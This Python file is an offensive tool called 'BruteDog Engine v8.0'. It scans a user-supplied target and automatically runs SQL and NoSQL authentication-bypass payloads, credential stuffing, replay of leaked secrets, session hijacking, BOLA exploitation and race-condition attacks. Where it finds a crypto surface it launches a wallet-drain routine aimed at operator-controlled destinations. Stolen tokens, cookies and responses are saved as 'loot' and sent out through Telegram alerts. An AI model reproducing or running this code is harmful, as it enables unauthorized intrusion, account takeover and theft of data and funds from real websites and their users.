#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v8.0 — State-Machine Logic & Cognitive Supreme Exploitation Engine
Features:
- Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
- Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
- Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
- Crawler-driven conditional module gating (Zero blind execution; modules fire strictly based on discovered surface area)
- Automated BOLA and state-skipping vector evaluation across security tiers
- Live autonomous test-account session propagation across exploit modules
- Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
- HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
- Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
- Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
- Fully Synchronized Autonomous Cognitive Reasoning Operator & Immutable disk exfiltration (loot_output/)
- Integrated with asynchronous Telegram telemetry broadcasting
"""
import asyncio
import json
import re
import socket
import sys
import time
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# Import weaponized offensive modules, transport middleware & live telemetry streamer
from modules.transport import SecureTransport
from modules.session_pool import PersistentSessionPool
from modules.response_diff import ResponseFingerprinter
from modules.scanner import run_port_scanner
from modules.crawler import crawl_target
from modules.db_assault import run_nosql_assault
from modules.session_hijack import run_session_hijack
from modules.race_condition import run_race_condition_test
from modules.live_login_verifier import execute_live_login_verification
from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
from modules.wallet_drain_probe import execute_probe
from modules.telemetry import stream_proof
from modules.loot_logger import save_session_loot

# Import the referral validation bypass probe & Autonomous Cognitive Brain
from modules.test_referral import audit_referral_logic
from modules.cognitive_operator import CognitiveOperator

# Import Telegram Notifier Dispatcher
from modules.telegram_notifier import send_telegram_alert

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 8
MAX_WORKERS = 5
MAX_RESPONSE_SIZE = 200_000

FALLBACK_LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
]

SESSION_VERIFICATION_ENDPOINTS = [
    "/api/user",
    "/api/auth/me",
    "/api/v1/user/profile",
    "/api/v1/auth/session",
    "/api/account",
    "/dashboard"
]

ERROR_PATTERNS = {
    "SQL syntax": re.compile(
        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|syntax error",
        re.I,
    ),
    "MongoDB error": re.compile(
        r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid",
        re.I,
    ),
    "Database exception": re.compile(
        r"database exception|query failed|"
        r"invalid query|database error|unhandled exception",
        re.I,
    ),
}

# ============================================================
# OUTPUT COLORS & FORMATTING
# ============================================================
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"
MAGENTA = "\033[95m"

def info(message):
    sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
    sys.stdout.flush()

def success(message):
    sys.stdout.write(f"{GREEN}[+] {message}{RESET}\n")
    sys.stdout.flush()

def warning(message):
    sys.stdout.write(f"{YELLOW}[!] {message}{RESET}\n")
    sys.stdout.flush()

def error(message):
    sys.stdout.write(f"{RED}[-] {message}{RESET}\n")
    sys.stdout.flush()

def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()

# Helper function to fire Telegram alerts non-blockingly from synchronous engine code
def dispatch_tg_alert(loot_type, details):
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

# ============================================================
# TARGET HANDLING
# ============================================================
def get_target():
    section("BRUTEDOG TARGET CONFIGURATION")
    print("Enter a domain, IP address, or server URL.")
    target = input("\nTarget: ").strip()
    if not target:
        raise ValueError("Target cannot be empty.")
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Unsupported protocol.")
    if not parsed.hostname:
        raise ValueError("Invalid hostname.")
    return target

def resolve_target(host):
    try:
        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
        return sorted({item[4][0] for item in results})
    except socket.gaierror:
        return []

# ============================================================
# ADAPTIVE RESPONSE ANALYSIS & COGNITIVE TELEMETRY
# ============================================================
def detect_database_errors(body):
    findings = []
    for label, pattern in ERROR_PATTERNS.items():
        if pattern.search(body or ""):
            findings.append(label)
    return findings

def inspect_cookie_security(headers):
    cookie = headers.get("set-cookie", "")
    if not cookie:
        return []
    issues = []
    lower = cookie.lower()
    if "secure" not in lower:
        issues.append("Secure attribute missing")
    if "httponly" not in lower:
        issues.append("HttpOnly attribute missing")
    if "samesite" not in lower:
        issues.append("SameSite attribute missing")
    return issues

def classify_and_adapt(response, current_payload, endpoint="", transport=None, fingerprinter=None, target_url=None, cognitive_brain=None):
    status = response.get("status", 0)
    body = response.get("body", "")
    headers = response.get("headers", {})
    findings = []
    mutated_payloads = []

    if fingerprinter:
        is_fp, fp_reason = fingerprinter.is_false_positive(status, body, headers)
        if is_fp:
            return [], []
    
    # ========================================================
    # COGNITIVE SUPREME COMMANDER EXECUTION HOOK
    # ========================================================
    if cognitive_brain:
        cognitive_result = cognitive_brain.evaluate_and_execute(
            endpoint=endpoint,
            status=status,
            headers=headers,
            body=body,
            transport=transport,
            target_url=target_url
        )
        
        if cognitive_result.get("success"):
            reasoning = cognitive_result.get("reasoning")
            findings.append({
                "type": "COGNITIVE_AUTONOMOUS_PIVOT_SUCCESS",
                "evidence": reasoning,
                "status": status
            })
            dispatch_tg_alert("Cognitive Autonomous Pivot Success", {"endpoint": endpoint, "evidence": reasoning})
    # ========================================================

    is_spa_shell = (
        "<div id=\"root\"></div>" in body or 
        "<div id=\"__next\"></div>" in body or 
        "<div id=\"app\"></div>" in body or
        len(body.strip()) < 200
    )
    
    has_valid_auth_indicator = any(k in body.lower() for k in ["access_token", "\"role\":\"admin\"", "\"user_id\":", "auth_token", "session_id", "cryptobyte"])
    
    if status in [200, 201, 302] and not is_spa_shell and (has_valid_auth_indicator or "token" in body.lower()):
        extracted_proof = {}
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                extracted_proof = {k: v for k, v in data.items() if any(sub in k.lower() for sub in ["token", "session", "cookie", "auth", "key"])}
        except:
            extracted_proof = {"raw_response_snippet": body[:200]}

        stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})

        save_session_loot(
            target=target_url or "unknown_target",
            endpoint=endpoint,
            finding_type="AUTHENTICATION_BYPASS_SUCCESS",
            status=status,
            headers=headers,
            body=body,
            extra_loot=extracted_proof
        )

        dispatch_tg_alert("Authentication Bypass Success", {"endpoint": endpoint, "status": status, "proof": extracted_proof})

        findings.append({
            "type": "AUTHENTICATION_BYPASS_SUCCESS",
            "evidence": f"Status {status} with verified non-SPA session payload",
            "status": status,
        })

    db_errors = detect_database_errors(body)
    for db_error in db_errors:
        sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
        sys.stdout.flush()
        
        save_session_loot(
            target=target_url or "unknown_target",
            endpoint=endpoint,
            finding_type=f"DATABASE_LEAK_{db_error.replace(' ', '_')}",
            status=status,
            headers=headers,
            body=body,
            extra_loot={"database_error": db_error}
        )

        dispatch_tg_alert(f"Database Leak ({db_error})", {"endpoint": endpoint, "status": status})

        findings.append({
            "type": "POTENTIAL_DATABASE_INJECTION",
            "evidence": db_error,
            "status": status,
        })
        if "MongoDB" in db_error:
            mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
        elif "SQL" in db_error:
            mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})

    for issue in inspect_cookie_security(headers):
        findings.append({
            "type": "SESSION_COOKIE_CONFIGURATION",
            "evidence": issue,
            "status": status,
        })
        
    return findings, mutated_payloads

def verify_hijacked_session(transport):
    for endpoint in SESSION_VERIFICATION_ENDPOINTS:
        sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected API route: {endpoint}{RESET}\n")
        status, headers, body = transport.request("GET", endpoint)
        
        is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or "<div id=\"__nuxt\"></div>" in body
        if status == 200 and not is_spa_shell and len(body) > 10:
            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
            success(f"[+] Session successfully verified against backend route: {endpoint}")
            
            save_session_loot(
                target=transport.base_path,
                endpoint=endpoint,
                finding_type="SESSION_HIJACK_VERIFIED",
                status=status,
                headers=headers,
                body=body,
                extra_loot={"cookie_jar": dict(transport.cookie_jar)}
            )

            dispatch_tg_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status})
            return True
        else:
            sys.stdout.write(f"{RED}[-] Verification at {endpoint} returned status {status} or generic SPA shell.{RESET}\n")
            
    sys.stdout.write(f"{RED}[-] All session verification routes exhausted or inactive.{RESET}\n")
    return False

# ============================================================
# ACTIVE ADAPTIVE ENDPOINT TESTING
# ============================================================
def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None, target_url=None, cognitive_brain=None):
    endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
    info(f"Targeting endpoint (State-Machine Adaptive Mode): {endpoint}")
    results = []
    
    test_queue = [
        {"name": "NoSQL Operator Probe", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
        {"name": "SQLi Union Probe", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
        {"name": "Admin Default Stuffing", "payload": {"username": "admin", "password": "password123"}},
        {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
    ]

    if leaked_secrets:
        for k, v in leaked_secrets.items():
            test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})

    if credentials_list and isinstance(credentials_list, list):
        for cred in credentials_list:
            if isinstance(cred, dict):
                test_queue.insert(0, {"name": "User Credential Stuffing", "payload": cred})

    executed_payloads = set()

    while test_queue:
        current_test = test_queue.pop(0)
        payload_key = json.dumps(current_test["payload"], sort_keys=True)
        if payload_key in executed_payloads:
            continue
        executed_payloads.add(payload_key)

        status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
        if status == 0:
            continue
            
        res_obj = {"status": status, "headers": headers, "body": body}
        findings, dynamic_mutations = classify_and_adapt(
            res_obj, current_test["payload"], endpoint=endpoint, transport=transport, fingerprinter=fingerprinter, target_url=target_url, cognitive_brain=cognitive_brain
        )
        
        if findings:
            results.append({
                "endpoint": endpoint,
                "test": current_test["name"],
                "status": status,
                "elapsed": 0.1,
                "findings": findings,
            })

        for idx, mutant in enumerate(dynamic_mutations, 1):
            test_queue.insert(0, {
                "name": f"Adaptive Mutant #{idx}",
                "payload": mutant
            })
        
    return results

# ============================================================
# ENGINE ORCHESTRATOR
# ============================================================
async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.0 (COGNITIVE COMMANDER)")
    try:
        if target_host:
            target_url = target_host.strip()
            if "://" not in target_url:
                target_url = "https://" + target_url
        else:
            target_url = get_target()

        parsed = urlsplit(target_url)
        host = parsed.hostname
        secure = parsed.scheme == "https"
        port = parsed.port or (443 if secure else 80)
        base_path = parsed.path.rstrip("/")
    except Exception as exc:
        error(f"Target configuration failed: {exc}")
        return [], 0.0

    cognitive_brain = CognitiveOperator(target_url=target_url)

    protocol = "HTTPS" if secure else "HTTP"
    info(f"Target Host : {host}")
    info(f"Target Port : {port}")
    info(f"Protocol    : {protocol}")
    
    section("DNS RESOLUTION")
    addresses = resolve_target(host)
    if not addresses:
        error("DNS resolution failed.")
        return [], 0.0
    for address in addresses:
        success(f"Resolved: {address}")

    section("ADVANCED NETWORK & SERVICE RECON (SCANNER V2.0)")
    try:
        scan_results = await run_port_scanner(host, concurrency=20)
        if scan_results.get("status") == "COMPLETED":
            open_port_list = scan_results.get("open_ports", [])
            success(f"Scanner V2.0 completed. Found {len(open_port_list)} open ports.")
            for p in open_port_list:
                missing_hdrs = p.get("details", {}).get("http", {}).get("missing_security_headers", [])
                if missing_hdrs:
                    warning(f"Port {p['port']} missing security headers: {missing_hdrs}")
    except Exception as exc:
        warning(f"Scanner integration warning: {exc}")
        
    start = time.monotonic()
    
    transport = SecureTransport(target_url)
    session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
    fingerprinter = ResponseFingerprinter()

    try:
        f_status, f_headers, f_body = transport.request("GET", "/brutedog-nonexistent-baseline-404")
        fingerprinter.capture_baseline("soft_404", f_status, f_body, f_headers)
        info("[+] Captured dynamic 404 response baseline for false-positive reduction.")
    except Exception:
        pass

    section("STATEFUL STATE-MACHINE MAPPING & RECON")
    recon_data = {}
    discovered_paths = []
    leaked_secrets = {}
    bola_vulnerabilities = []
    session_cookie_payload = None

    try:
        recon_data = crawl_target(transport)
        if isinstance(recon_data, dict):
            discovered_paths = recon_data.get("endpoints", [])
            leaked_secrets = recon_data.get("leaked_secrets", {})
            bola_vulnerabilities = recon_data.get("bola_vulnerabilities", {})
            session_cookie_payload = recon_data.get("session_cookie")
    except Exception as exc:
        warning(f"State-machine crawler encountered an issue: {exc}. Falling back to default list.")

    if not discovered_paths:
        discovered_paths = FALLBACK_LOGIN_PATHS

    active_cookies = session_cookie_payload if session_cookie_payload else getattr(transport, "cookie_jar", None)
    if active_cookies:
        success("Propagating active operator session cookie across transport layer safely.")
        try:
            if isinstance(active_cookies, dict):
                for k, v in active_cookies.items():
                    session_pool.cookie_jar.set(k, v)
                    if hasattr(transport, "cookie_jar") and isinstance(transport.cookie_jar, dict):
                        transport.cookie_jar[k] = v
            elif isinstance(active_cookies, str):
                for pair in active_cookies.split(";"):
                    if "=" in pair:
                        k, v = pair.strip().split("=", 1)
                        if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                            session_pool.cookie_jar.set(k, v)
            elif hasattr(active_cookies, "items"):
                for k, v in active_cookies.items():
                    session_pool.cookie_jar.set(k, v)
            else:
                session_pool.cookie_jar.update(active_cookies)
        except Exception as sync_exc:
            warning(f"Cookie synchronization notice: {sync_exc}")

        verify_hijacked_session(transport)

    has_referral_surface = any("referral" in p.lower() or "invite" in p.lower() or "ref" in p.lower() for p in discovered_paths)
    if has_referral_surface:
        section("REFERRAL GATEWAY VALIDATION AUDIT (TRIGGERED BY CRAWLER)")
        try:
            info("Referral/invite path detected in target mapping. Dispatching validation audit...")
            await asyncio.to_thread(audit_referral_logic)
        except Exception as exc:
            warning(f"Referral audit probe encountered an issue: {exc}")
    else:
        info("[*] Intelligence Gate: No referral or invite vectors mapped by crawler. Skipping test_referral module.")

    if leaked_secrets:
        warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
        dispatch_tg_alert("Leaked Secrets Discovered", {"target": target_url, "secrets": leaked_secrets})

    if bola_vulnerabilities:
        warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
        section("LIVE BOLA / STATE-SKIPPING VERIFICATION ASSAULT")
        for bola_route in bola_vulnerabilities:
            dispatch_tg_alert("BOLA / State-Skipping Route", {"route": bola_route})
            execute_live_login_verification(
                target_url=target_url,
                endpoint=bola_route,
                cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None
            )

    section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
    all_results = []
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    async def worker(path):
        async with semaphore:
            return await asyncio.to_thread(
                test_endpoint, transport, path, credentials_list, leaked_secrets, fingerprinter, target_url, cognitive_brain
            )
            
    tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
    
    for completed in asyncio.as_completed(tasks):
        try:
            results = await completed
            if results:
                all_results.extend(results)
        except Exception as exc:
            error(f"Endpoint worker failed: {exc}")

    has_db_surface = any("login" in p.lower() or "auth" in p.lower() or "user" in p.lower() for p in discovered_paths)
    if has_db_surface:
        try:
            db_res = await run_nosql_assault(target_url, port=port, use_ssl=secure)
            if db_res:
                dispatch_tg_alert("Database Assault Breach", {"target": target_url, "details": str(db_res)[:300]})
        except Exception as exc:
            error(f"Database assault failed: {exc}")
    else:
        info("[*] Intelligence Gate: No viable database/login sinks mapped. Skipping NoSQL assault.")

    try:
        hijack_results = await run_session_hijack(target_url, port=port, use_ssl=secure)
        if hijack_results:
            for finding in hijack_results:
                if finding.get("status") == "VERIFIED_ACCESS":
                    endpoint_hit = finding.get("endpoint", "/admin")
                    dispatch_tg_alert("Verified Session Hijack", {"endpoint": endpoint_hit})
                    execute_live_login_verification(
                        target_url=target_url,
                        endpoint=endpoint_hit,
                        cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None,
                        token=finding.get("forged_token")
                    )
    except Exception as exc:
        error(f"Session hijack failed: {exc}")

    try:
        race_res = await run_race_condition_test(
            target_url, 
            port=port, 
            use_ssl=secure, 
            session_pool=session_pool
        )
        if race_res:
            dispatch_tg_alert("Race Condition Test Success", {"target": target_url})
    except Exception as exc:
        error(f"Race condition module failed: {exc}")

    has_web3_surface = any("crypto" in p.lower() or "wallet" in p.lower() or "drain" in p.lower() or "token" in p.lower() for p in discovered_paths)
    if has_web3_surface:
        try:
            await run_drainer_engine(target_url)
            operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
            info(f"[*] Dispatching Wallet Drain Probe on {target_url} with operator destination: {operator_evm_dest}")
            session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
            await asyncio.to_thread(
                execute_probe, 
                target_host=target_url,
                session_cookies=session_cookies_dict, 
                target_wallet=operator_evm_dest
            )
            dispatch_tg_alert("Wallet Drain Probe Dispatched", {"target": target_url, "destination": operator_evm_dest})
        except Exception as exc:
            error(f"Drainer / liquidity audit & probe engine failed: {exc}")
    else:
        info("[*] Intelligence Gate: No Web3 or crypto surface area mapped. Skipping wallet drain probe.")
            
    duration = round(time.monotonic() - start, 2)
    
    section("ENGINE SUMMARY")
    tested = len(all_results)
    potential = sum(len(item["findings"]) for item in all_results) + len(bola_vulnerabilities)
    success(f"Target: {host}")
    success(f"Discovered/Mapped endpoints: {len(discovered_paths)}")
    success(f"BOLA / State-Skipping hits: {len(bola_vulnerabilities)}")
    success(f"Total adaptive requests executed: {tested}")
    success(f"Vulnerability / Exploitation hits: {potential}")
    success(f"Engine duration: {duration}s")
    section("ENGINE COMPLETE")
    return all_results, duration

if __name__ == "__main__":
    try:
        asyncio.run(run_autonomous_engine())
    except KeyboardInterrupt:
        warning("Engine interrupted by operator.")
    except Exception as exc:
        error(f"Engine crashed: {exc}")
